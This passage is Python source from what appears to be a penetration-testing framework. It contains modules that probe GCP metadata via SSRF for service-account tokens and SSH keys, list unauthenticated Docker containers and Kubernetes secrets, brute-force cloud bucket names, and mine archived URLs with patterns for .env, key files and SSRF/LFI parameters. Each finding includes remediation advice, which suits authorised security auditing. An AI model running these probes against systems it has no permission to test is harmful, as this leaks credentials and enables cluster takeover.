                return e.code, e.read(2048).decode("utf-8", errors="replace"), probe_url
            except Exception:
                continue
        return 0, "", ""

    def execute(self, params: dict, job_id: str, stream) -> dict:
        target_url = params.get("target_url", "").strip()
        ssrf_param = params.get("ssrf_param", "url").strip()
        mode = params.get("mode", "ssrf")
        endpoints = params.get("endpoints", ["sa_token", "project"])
        auth = params.get("auth_header", "").strip()

        findings = []
        raw_lines = [f"Mode: {mode}", f"Endpoints: {endpoints}"]

        for ep_key in endpoints:
            path = self.METADATA_PATHS.get(ep_key, "")
            if not path:
                continue
            stream("info", f"Probing GCP metadata: {ep_key} ({path})")

            if mode == "direct":
                code, body, url = self._probe_direct(path)
            else:
                if not target_url:
                    stream("warning", "SSRF mode requires a target URL — skipping")
                    break
                code, body, url = self._probe_via_ssrf(target_url, ssrf_param, path, auth)

            raw_lines.append(f"[{ep_key}] HTTP {code}: {body[:80]}")

            if code == 200 and body and "computeMetadata" not in body.lower():
                sensitive_keys = {
                    "sa_token":  ("access_token", "token_type"),
                    "ssh_keys":  ("ssh-rsa", "ssh-ed25519"),
                    "startup":   ("#!", "curl", "wget", "password"),
                    "project":   (),
                    "email":     ("@",),
                }
                is_sensitive = any(
                    ind in body for ind in sensitive_keys.get(ep_key, ())
                ) or ep_key in ("project", "instance", "email", "scopes")

                severity = "critical" if ep_key in ("sa_token", "ssh_keys", "startup") else "high"
                stream("success" if is_sensitive else "info", f"[{ep_key}] Data retrieved: {body[:60]}")
                findings.append({
                    "title": f"GCP metadata accessible: {ep_key}",
                    "severity": severity,
                    "url": url,
                    "description": (
                        f"GCP metadata endpoint '{path}' returned data via {mode}. "
                        + ("Service account token exposed — immediate credential rotation required!" if ep_key == "sa_token" else "")
                    ),
                    "evidence": f"HTTP {code}\n{body[:800]}",
                    "remediation": (
                        "Enable GCP Workload Identity. Block SSRF to 169.254.169.254 and metadata.google.internal. "
                        "Restrict OAuth scopes per service account. Rotate exposed tokens immediately."
                    ),
                    "cvss_score": 10.0 if ep_key == "sa_token" else 8.5,
                    "cwe_id": "CWE-918",
                })

        if not findings:
            findings.append({
                "title": "GCP metadata — not accessible via tested methods",
                "severity": "info", "url": target_url or self.METADATA_BASE,
                "description": "GCP metadata endpoints returned no data via direct or SSRF probing.",
                "evidence": "\n".join(raw_lines),
                "remediation": "Maintain IMDSv2 restrictions and block SSRF at network perimeter.",
            })

        stream("success", f"GCP metadata test complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [C-05] Docker & Kubernetes API Exposure ─────────────────────────────────

class DockerK8sExposureModule(BaseModule):
    id = "C-05"
    name = "Docker & Kubernetes API Exposure"
    category = "cloud"
    description = (
        "Probe for exposed Docker daemon (port 2375/2376) and Kubernetes API server "
        "(ports 6443/8001/8080/10250) on the target host. Attempt unauthenticated "
        "calls to list containers, pods, or secrets."
    )
    risk_level = "critical"
    tags = ["docker", "kubernetes", "k8s", "container", "api", "exposure", "cloud"]
    celery_queue = "web_audit_queue"
    time_limit = 90

    PARAMETER_SCHEMA = [
        FieldSchema(key="target_host",  label="Target Host (IP or hostname)",  field_type="text",  required=True,
                    placeholder="10.0.0.1"),
        FieldSchema(
            key="checks",
            label="Components to Check",
            field_type="checkbox_group",
            default=["docker_tcp", "k8s_api", "kubelet"],
            options=[
                {"value": "docker_tcp",   "label": "Docker TCP (2375 plaintext, 2376 TLS)"},
                {"value": "k8s_api",      "label": "Kubernetes API server (6443/8001/8080)"},
                {"value": "kubelet",      "label": "Kubelet API (10250/10255)"},
                {"value": "etcd",         "label": "etcd (2379/2380)"},
                {"value": "k8s_dashboard", "label": "Kubernetes Dashboard (8001, 30000-32767)"},
            ],
        ),
        FieldSchema(key="timeout",      label="Connect timeout (s)",  field_type="number", default=5),
    ]

    def _http_get(self, url: str, timeout: int, verify_ssl: bool = False) -> tuple:
        import urllib.request, urllib.error, ssl
        ctx = ssl.create_default_context() if not verify_ssl else None
        if ctx:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={"User-Agent": "PenTools/1.0"})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read(16384).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(4096).decode("utf-8", errors="replace")
        except Exception as ex:
            return 0, str(ex)

    def _tcp_check(self, host: str, port: int, timeout: int) -> bool:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            return True
        except Exception:
            return False
        finally:
            s.close()

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import json

        host = params["target_host"].strip()
        checks = params.get("checks", ["docker_tcp", "k8s_api"])
        timeout = int(params.get("timeout", 5))

        findings = []
        raw_lines = [f"Target: {host}", f"Checks: {checks}"]

        # ── Docker TCP ──
        if "docker_tcp" in checks:
            for port, scheme in [(2375, "http"), (2376, "https")]:
                url = f"{scheme}://{host}:{port}/version"
                stream("info", f"Probing Docker {scheme.upper()} on :{port}")
                if not self._tcp_check(host, port, timeout):
                    raw_lines.append(f"Docker :{port} — port closed")
                    continue
                code, body = self._http_get(url, timeout, verify_ssl=False)
                raw_lines.append(f"Docker :{port} HTTP {code}: {body[:60]}")
                if code == 200 and "ApiVersion" in body:
                    stream("success", f"Docker API exposed on :{port}!")
                    try:
                        info = json.loads(body)
                        version_str = info.get("Version", "unknown")
                    except Exception:
                        version_str = "unknown"
                    # Try listing containers
                    containers_code, containers_body = self._http_get(
                        f"{scheme}://{host}:{port}/containers/json?all=1", timeout, verify_ssl=False)
                    findings.append({
                        "title": f"Docker API exposed on {host}:{port}",
                        "severity": "critical",
                        "url": url,
                        "description": (
                            f"Docker daemon API is accessible without authentication on port {port}. "
                            f"Docker version: {version_str}. "
                            "An attacker can run arbitrary containers, read host filesystem, escalate to root."
                        ),
                        "evidence": (
                            f"HTTP {code}\nVersion: {body[:300]}\n"
                            + (f"Containers HTTP {containers_code}: {containers_body[:500]}" if containers_code == 200 else "")
                        ),
                        "remediation": (
                            "Never expose Docker socket or TCP port without mTLS. "
                            "Use Docker socket proxy with read-only restrictions. "
                            "Firewall port 2375/2376 to localhost only."
                        ),
                        "cvss_score": 10.0, "cwe_id": "CWE-306",
                    })

        # ── Kubernetes API ──
        if "k8s_api" in checks:
            for port, scheme in [(6443, "https"), (8001, "http"), (8080, "http")]:
                url = f"{scheme}://{host}:{port}/api/v1"
                stream("info", f"Probing K8s API on :{port}")
                if not self._tcp_check(host, port, timeout):
                    continue
                code, body = self._http_get(url, timeout, verify_ssl=False)
                raw_lines.append(f"K8s :{port} HTTP {code}: {body[:60]}")
                if code == 200 and ("serverVersion" in body or "groupVersion" in body or "v1" in body):
                    stream("success", f"Kubernetes API accessible on :{port}!")
                    # Try listing namespaces
                    ns_code, ns_body = self._http_get(
                        f"{scheme}://{host}:{port}/api/v1/namespaces", timeout, verify_ssl=False)
                    # Try listing secrets
                    sec_code, sec_body = self._http_get(
                        f"{scheme}://{host}:{port}/api/v1/secrets", timeout, verify_ssl=False)
                    has_secrets = sec_code == 200 and "items" in sec_body
                    findings.append({
                        "title": f"Kubernetes API server exposed without auth on :{port}",
                        "severity": "critical",
                        "url": url,
                        "description": (
                            f"Kubernetes API server on port {port} is accessible. "
                            + ("Secrets are readable without authentication! " if has_secrets else "")
                            + "An attacker can deploy pods, read secrets, and take over the cluster."
                        ),
                        "evidence": (
                            f"HTTP {code}\n/api/v1: {body[:200]}\n"
                            + (f"Namespaces HTTP {ns_code}: {ns_body[:200]}\n" if ns_code == 200 else "")
                            + (f"Secrets HTTP {sec_code}: {sec_body[:500]}" if has_secrets else "")
                        ),
                        "remediation": (
                            "Enable RBAC authentication on the API server. "
                            "Set --anonymous-auth=false. "
                            "Restrict network access to the API server with firewall rules."
                        ),
                        "cvss_score": 10.0, "cwe_id": "CWE-306",
                    })

        # ── Kubelet ──
        if "kubelet" in checks:
            for port, scheme in [(10250, "https"), (10255, "http")]:
                url = f"{scheme}://{host}:{port}/pods"
                stream("info", f"Probing Kubelet on :{port}")
                if not self._tcp_check(host, port, timeout):
                    continue
                code, body = self._http_get(url, timeout, verify_ssl=False)
                raw_lines.append(f"Kubelet :{port} HTTP {code}: {body[:60]}")
                if code == 200 and "items" in body:
                    stream("success", f"Kubelet API exposed on :{port}!")
                    findings.append({
                        "title": f"Kubelet API exposed on {host}:{port}",
                        "severity": "critical",
                        "url": url,
                        "description": (
                            f"Kubelet API on port {port} returns pod listing without authentication. "
                            "An attacker can execute commands in running pods via /exec endpoint."
                        ),
                        "evidence": f"HTTP {code}\nPods: {body[:500]}",
                        "remediation": (
                            "Enable Kubelet authentication (--authentication-token-webhook=true). "
                            "Set --authorization-mode=Webhook. "
                            "Disable anonymous access (--anonymous-auth=false)."
                        ),
                        "cvss_score": 10.0, "cwe_id": "CWE-306",
                    })

        # ── etcd ──
        if "etcd" in checks:
            for port in [2379, 2380]:
                if not self._tcp_check(host, port, timeout):
                    continue
                url = f"http://{host}:{port}/v3/kv/range"
                stream("info", f"Probing etcd on :{port}")
                code, body = self._http_get(url, timeout)
                raw_lines.append(f"etcd :{port} HTTP {code}: {body[:40]}")
                if code in (200, 405, 400):  # responds
                    findings.append({
                        "title": f"etcd API accessible on {host}:{port}",
                        "severity": "critical",
                        "url": f"http://{host}:{port}",
                        "description": "etcd is accessible. Kubernetes secrets and cluster state may be readable.",
                        "evidence": f"HTTP {code}: {body[:400]}",
                        "remediation": "Enable etcd peer/client TLS. Firewall etcd ports. Enable etcd authentication.",
                        "cvss_score": 10.0, "cwe_id": "CWE-306",
                    })

        if not findings:
            findings.append({
                "title": "Docker/K8s exposure — no unauthenticated APIs found",
                "severity": "info", "url": host,
                "description": "All checked ports are either closed or require authentication.",
                "evidence": "\n".join(raw_lines),
                "remediation": "Maintain current access controls. Periodic re-test after infrastructure changes.",
            })

        stream("success", f"Docker/K8s audit complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}


# ─── [C-06] Cloud Asset Brute-force ──────────────────────────────────────────

class CloudBruteModule(BaseModule):
    id = "C-06"
    name = "Cloud Asset Discovery (Brute-force)"
    category = "cloud"
    description = (
        "Enumerate publicly exposed cloud assets (S3 buckets, Azure Blob Storage, "
        "GCP buckets, Lambda/Cloud Functions) by brute-forcing common naming patterns "
        "derived from the target company/domain name."
    )
    risk_level = "medium"
    tags = ["cloud", "s3", "azure", "gcp", "buckets", "brute-force", "asset-discovery"]
    celery_queue = "recon_queue"
    time_limit = 1200

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="company",
            label="Company / Keyword",
            field_type="text",
            required=True,
            placeholder="acme",
            help_text="Base name for permutation generation (company slug, domain prefix, etc.).",
        ),
        FieldSchema(
            key="providers",
            label="Cloud Providers",
            field_type="checkbox_group",
            default=["aws", "gcp", "azure"],
            options=[
                {"value": "aws",   "label": "AWS S3"},
                {"value": "gcp",   "label": "Google Cloud Storage"},
                {"value": "azure", "label": "Azure Blob Storage"},
            ],
        ),
        FieldSchema(
            key="threads",
            label="Threads",
            field_type="range_slider",
            default=100,
            min_value=10,
            max_value=500,
            step=10,
        ),
    ]

    # Common suffixes/prefixes used in bucket naming
    _WORDLIST = [
        "", "-dev", "-prod", "-staging", "-qa", "-backup", "-bak", "-test",
        "-data", "-files", "-assets", "-media", "-static", "-public", "-private",
        "-internal", "-infra", "-logs", "-uat", "-cdn", "-images", "-uploads",
        "-storage", "-bucket", "-archive", "-old", "-new", "-temp", "-tmp",
        "-web", "-api", "-app", "-db", "-database", "-config", "-secrets",
        ".dev", ".prod", ".backup", ".internal", ".assets",
        "dev-", "prod-", "staging-", "backup-", "test-",
        "data-", "files-", "assets-", "media-", "static-",
    ]

    # Provider-specific URL templates: (name) → URL to check, expected open response
    _PROVIDERS = {
        "aws":   ("https://{name}.s3.amazonaws.com/", "<ListBucketResult", 200),
        "gcp":   ("https://storage.googleapis.com/{name}/", "<ListBucketResult", 200),
        "azure": ("https://{name}.blob.core.windows.net/?comp=list", "<EnumerationResults", 200),
    }

    def _check_bucket(self, url: str) -> tuple[int, str]:
        import urllib.request, urllib.error
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "PenTools/1.0"}, method="GET")
            with urllib.request.urlopen(req, timeout=8) as r:
                return r.status, r.read(2048).decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, ""
        except Exception:
            return 0, ""

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import concurrent.futures

        company = params["company"].strip().lower().replace(" ", "-")
        providers = params.get("providers", ["aws", "gcp", "azure"])
        threads = params.get("threads", 100)

        # Generate candidate names
        candidates = []
        for suffix in self._WORDLIST:
            name = f"{company}{suffix}"
            candidates.append(name)
            if suffix:
                candidates.append(f"{suffix.strip('-.')}{company}")

        # Deduplicate while preserving order
        seen = set()
        unique = [c for c in candidates if not (c in seen or seen.add(c))]

        stream("info", f"Testing {len(unique)} name candidates across {len(providers)} provider(s)...")

        findings = []
        checked = 0

        def check_one(name_provider):
            name, provider = name_provider
            tmpl, open_marker, expected_code = self._PROVIDERS[provider]
            url = tmpl.format(name=name)
            code, body = self._check_bucket(url)
            return name, provider, url, code, body, open_marker, expected_code

        tasks = [(name, p) for p in providers if p in self._PROVIDERS for name in unique]
        stream("info", f"Total probes: {len(tasks)}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=min(threads, 100)) as ex:
            futures = {ex.submit(check_one, t): t for t in tasks}
            for future in concurrent.futures.as_completed(futures):
                checked += 1
                name, provider, url, code, body, open_marker, expected_code = future.result()

                if checked % 200 == 0:
                    stream("info", f"Progress: {checked}/{len(tasks)} probes done, {len(findings)} open buckets found.")

                if code == expected_code and open_marker in body:
                    stream("success", f"OPEN BUCKET: [{provider.upper()}] {url}")
                    findings.append({
                        "title": f"Open {provider.upper()} bucket: {name}",
                        "severity": "high",
                        "url": url,
                        "description": (
                            f"Cloud storage bucket '{name}' on {provider.upper()} is publicly "
                            f"accessible and lists its contents without authentication."
                        ),
                        "evidence": f"HTTP {code}\n{body[:500]}",
                        "remediation": (
                            "Enable Block Public Access (AWS S3), set uniform bucket access (GCP), "
                            "or disable public blob access (Azure). "
                            "Apply IAM policies restricting bucket access to specific service accounts."
                        ),
                        "metadata": {"provider": provider, "bucket_name": name},
                    })
                elif code in (403, 405):
                    # 403 = bucket exists but no public access — low severity info
                    findings.append({
                        "title": f"Private {provider.upper()} bucket exists: {name}",
                        "severity": "low",
                        "url": url,
                        "description": (
                            f"Bucket '{name}' exists on {provider.upper()} (HTTP {code}) "
                            f"but has no public read access. "
                            f"Verify it belongs to the target organisation."
                        ),
                        "evidence": f"HTTP {code}",
                        "remediation": "Confirm bucket ownership. Ensure no sensitive data is exposed under misconfigured paths.",
                        "metadata": {"provider": provider, "bucket_name": name},
                    })

        public = [f for f in findings if f["severity"] == "high"]
        stream("success", f"CloudBrute complete — {len(public)} open buckets, {len(findings) - len(public)} private buckets found.")
        return {"status": "done", "findings": findings, "raw_output": f"Checked {checked} buckets."}


# ─── [C-07] Historical Endpoint Discovery ────────────────────────────────────

class EndpointHistoryModule(BaseModule):
    id = "C-07"
    name = "Historical Endpoint Discovery"
    category = "cloud"
    description = (
        "Discover forgotten/hidden endpoints via historical web archives: "
        "Wayback Machine (waybackurls), AlienVault OTX, CommonCrawl, and URLScan (gau). "
        "Surfaces old API paths, debug endpoints, leaked files, and backup URLs."
    )
    risk_level = "medium"
    tags = ["waybackurls", "gau", "recon", "endpoints", "osint", "url-discovery"]
    celery_queue = "recon_queue"
    time_limit = 600

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="domain",
            label="Domain",
            field_type="text",
            required=True,
            placeholder="example.com",
            help_text="Root domain (without https://).",
        ),
        FieldSchema(
            key="sources",
            label="URL Sources",
            field_type="checkbox_group",
            default=["waybackurls", "gau"],
            options=[
                {"value": "waybackurls", "label": "Wayback Machine (waybackurls)"},
                {"value": "gau",         "label": "All sources: OTX + CommonCrawl + URLScan (gau)"},
            ],
        ),
        FieldSchema(
            key="filter_interesting",
            label="Filter Interesting URLs Only",
            field_type="toggle",
            default=True,
            help_text="Show only URLs with interesting extensions or keywords (api, admin, backup, .sql, .env, etc.).",
        ),
        FieldSchema(
            key="probe_live",
            label="Probe URLs for Live Responses (httpx)",
            field_type="toggle",
            default=False,
            help_text="Verify which historical URLs are still live. Can be slow for large datasets.",
        ),
    ]

    _INTERESTING_PATTERNS = [
        r"\.(sql|bak|backup|env|log|conf|config|ini|yaml|yml|json|xml|csv|xls|xlsx|pem|key|p12|pfx|tar|zip|gz|7z)(\?|$)",
        r"/(api|admin|dashboard|panel|upload|download|backup|debug|test|dev|staging|internal|secret|private|token|auth)/",
        r"/v[0-9]+/",       # versioned API paths
        r"\?.*=(https?://|file://|/etc/|/proc/)",  # potential SSRF/LFI params
        r"/(login|signin|register|password|forgot|reset)",
        r"\.(php|asp|aspx|jsp|cgi|cfm|do|action)(\?|$)",  # legacy server-side scripts
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import re
        from pathlib import Path

        domain = params["domain"].strip().lower()
        sources = params.get("sources", ["waybackurls", "gau"])
        filter_interesting = params.get("filter_interesting", True)
        probe_live = params.get("probe_live", False)

        work_dir = Path(f"/tmp/pentools/{job_id}")
        work_dir.mkdir(parents=True, exist_ok=True)

        all_urls: set[str] = set()

        # ── waybackurls ──────────────────────────────────────────────────────
        if "waybackurls" in sources:
            import os
            wayback_bin = "/opt/tools/bin/waybackurls"
            if os.path.isfile(wayback_bin):
                stream("info", f"Fetching Wayback Machine URLs for {domain}...")
                runner = ToolRunner("waybackurls")
                result = runner.run(args=[domain], stream=stream, timeout=120)
                urls = {u.strip() for u in result.get("stdout", "").splitlines() if u.strip().startswith("http")}
                all_urls |= urls
                stream("success", f"waybackurls: {len(urls)} URLs found.")
            else:
                stream("warning", "waybackurls not installed yet — skipping.")

        # ── gau ──────────────────────────────────────────────────────────────
        if "gau" in sources:
            import os
            gau_bin = "/opt/tools/bin/gau"
            if os.path.isfile(gau_bin):
                stream("info", f"Fetching URLs from OTX + CommonCrawl + URLScan for {domain}...")
                runner = ToolRunner("gau")
                result = runner.run(
                    args=["--threads", "5", "--timeout", "60", domain],
                    stream=stream, timeout=120,
                )
                before = len(all_urls)
                urls = {u.strip() for u in result.get("stdout", "").splitlines() if u.strip().startswith("http")}
                all_urls |= urls
                stream("success", f"gau: {len(all_urls) - before} additional URLs.")
            else:
                stream("warning", "gau not installed yet — skipping.")

        if not all_urls:
            stream("error", "No URLs found from any source.")
            return {"status": "failed", "findings": [], "raw_output": ""}

        stream("success", f"Total unique URLs collected: {len(all_urls)}")

        # ── Filter interesting URLs ───────────────────────────────────────────
        if filter_interesting:
            patterns = [re.compile(p, re.IGNORECASE) for p in self._INTERESTING_PATTERNS]
            interesting = {u for u in all_urls if any(p.search(u) for p in patterns)}
            stream("info", f"Filtered to {len(interesting)} interesting URLs (from {len(all_urls)} total).")
            scan_urls = interesting
        else:
            scan_urls = all_urls

        # ── Optionally probe with httpx ───────────────────────────────────────
        live_responses: dict[str, dict] = {}
        if probe_live and scan_urls:
            import json
            url_list_file = work_dir / "urls.txt"
            url_list_file.write_text("\n".join(sorted(scan_urls)[:3000]))

            stream("info", f"Probing {min(len(scan_urls), 3000)} URLs with httpx...")
            httpx_out = work_dir / "httpx.json"
            runner = ToolRunner("httpx")
            runner.run(
                args=["-l", str(url_list_file), "-json", "-o", str(httpx_out),
                      "-threads", "50", "-silent", "-status-code", "-no-color"],
                stream=stream, timeout=300,
            )
            if httpx_out.exists():
                for line in httpx_out.read_text().splitlines():
                    try:
                        entry = json.loads(line)
                        live_responses[entry.get("url", "")] = entry
                    except Exception:
                        pass
                stream("success", f"httpx: {len(live_responses)} live URLs confirmed.")

        # ── Build findings ────────────────────────────────────────────────────
        findings = []
        for url in sorted(scan_urls):
            live = live_responses.get(url, {}) if probe_live else {}
            sc = live.get("status-code", "")
            severity = "info"

            # Escalate severity for interesting file types
            if re.search(r"\.(sql|bak|backup|env|pem|key|p12|pfx)(\?|$)", url, re.I):
                severity = "high"
            elif re.search(r"\.(conf|config|log|ini|yaml|yml|json|xml)(\?|$)", url, re.I):
                severity = "medium"
            elif re.search(r"/(api|admin|dashboard|panel|debug|internal|secret|private|token|auth)/", url, re.I):
                severity = "medium"

            title = f"Historical endpoint: {url[:100]}"
            desc = f"Discovered via web archive sources."
            if sc:
                desc += f" Currently returns HTTP {sc}."
                if int(str(sc)) in (200, 301, 302):
                    severity = max(severity, "medium",
                                   key=lambda s: {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}.get(s, 0))

            findings.append({
                "title": title,
                "severity": severity,
                "url": url,
                "description": desc,
                "evidence": f"Sources: {', '.join(sources)}",
                "remediation": (
                    "Review this endpoint. If it exposes sensitive data or is no longer needed, "
                    "ensure it is properly secured or removed. Add to robots.txt is insufficient — "
                    "remove the content from the server."
                ),
            })

        stream("success", f"C-07 complete — {len(findings)} interesting historical endpoints found.")
        return {
            "status": "done",
            "findings": findings,
            "raw_output": f"Total URLs: {len(all_urls)} | Interesting: {len(scan_urls)} | Live: {len(live_responses)}",
            "metadata": {"total_urls": len(all_urls), "interesting": len(scan_urls)},
        }
